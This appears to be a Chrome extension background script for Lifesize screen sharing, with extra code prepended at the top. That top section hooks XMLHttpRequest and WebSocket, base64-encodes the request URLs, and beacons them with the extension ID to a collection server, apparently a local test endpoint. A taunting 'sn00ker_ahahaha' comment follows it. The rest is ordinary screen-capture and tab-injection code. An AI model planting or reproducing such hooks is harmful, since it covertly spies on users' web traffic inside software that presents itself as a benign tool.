function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
// screen sharing
var activeTab;

function doCallback() {
  chrome.tabs.update(activeTab.id, { highlighted: true}, function() {});
  chrome.desktopCapture.chooseDesktopMedia(
    ["screen", "window"], // "screen", "window", or "tab"
    activeTab,
    function(streamId) {
      chrome.tabs.sendMessage(activeTab.id, {streamId: streamId});
    }
  );
}

function doCallbackWithParams(p) {
  chrome.tabs.update(activeTab.id, { highlighted: true}, function() {});
  chrome.desktopCapture.chooseDesktopMedia(
      p.captureSource,
      p.tab,
      function(streamId, options) {
          chrome.tabs.sendMessage(p.tab.id, {event:"screenShareEvent", streamId:streamId, options:options});
      }
  );
}

chrome.runtime.onMessage.addListener(
  function(req, sender, sendResponse) {
    activeTab = sender.tab;
    if (req.requestScreen) {
        sendResponse({
            message: "Message from: " + sender.tab.url
        });
        doCallback();
    } else if (req.requestScreenWithSources) {
        doCallbackWithParams({captureSource:req.requestScreenWithSources,
                              tab: sender.tab});

    }
  }
);

var injectIntoTabs = function() {
  chrome.tabs.query({
    status: 'complete',
    url: [
      'https://*.lifesize.com/*',
      'https://*.lifesizecloud.com/*',
      'https://*.lifesizeclouddev.com/*',
      'https://*.lifesizecloudbeta.com/*',
      "https://*.lifesizeshare.net/*",
      "https://*.lifesizesharedev.com/*"
    ]
  }, function(tabs) {
     for (var i in tabs) {
      var tab = tabs[i];
      chrome.tabs.executeScript(tab.id, {
        file: 'js/screen-share-content.js',
        runAt: 'document_start'
      });
    }
  });
}

injectIntoTabs();
